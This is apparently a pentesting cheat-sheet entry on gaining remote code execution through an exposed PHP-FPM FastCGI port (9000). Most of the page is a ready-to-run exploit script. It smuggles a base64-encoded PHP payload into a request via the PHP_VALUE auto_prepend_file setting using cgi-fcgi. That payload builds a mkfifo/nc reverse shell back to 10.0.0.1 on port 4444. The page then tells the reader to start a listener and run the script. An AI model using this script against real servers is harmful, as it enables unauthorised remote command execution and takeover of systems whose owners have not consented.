---
title: FastCGI Pentesting
description: FastCGI is a binary protocol for interfacing interactive programs with a web server. It uses 9000 port by default.
tags:
    - Network
    - Privilege Escalation
refs:
date: 2023-04-10
draft: false
---

## Investigation

If the **PHP-FPM (FastCGI  Process Manager)** is running on the target system, we might be able to execute arbitrary command.

```bash
ps aux | cat

php-fpm: pool username
```

<br />

## Remote Code Execution

Reference: [https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi)

We need to create an arbitrary PHP file somewhere. For instance,

```bash
touch /dev/shm/index.php
```

Then create a shell script named **"exploit.sh"**.

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f'); echo '-->';"
FILENAMES="/dev/shm/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

Now execute the shell script. Of course we have to start a listener in local machine for reverse shell before executing the following command.

```bash
chmod +x exploit.sh
./exploit.sh
```
